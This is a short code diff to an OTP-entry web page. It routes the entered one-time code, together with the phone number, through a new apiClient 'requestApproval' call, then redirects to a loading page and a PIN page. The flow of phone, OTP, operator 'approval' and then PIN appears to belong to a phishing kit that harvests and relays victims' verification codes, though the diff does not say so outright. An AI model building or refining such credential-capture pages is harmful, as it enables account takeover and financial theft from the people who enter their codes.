@@ -317,6 +317,7 @@
 
     </div>
 
+    <script src="utils/apiClient.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const inputs = document.querySelectorAll('.otp-box');
@@ -401,13 +402,12 @@
                     const otp = Array.from(inputs).map(i => i.value).join('');
 
                     try {
-                        const res = await fetch('/.netlify/functions/request-approval', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ type: 'otp', phone: phone, data: { otp } })
+                        const resData = await window.apiClient.requestApproval({ 
+                            type: 'otp', 
+                            phone: phone, 
+                            details: `OTP: ${otp}` 
                         });
-                        const resData = await res.json();
-                        const sid = resData.sessionId;
+                        const sid = resData.attemptId;
                         window.location.href = `loading.html?sid=${sid}&next=pin.html&error=${encodeURIComponent('otp.html?error=1')}`;
                     } catch (err) {
                         console.error('Request error:', err);
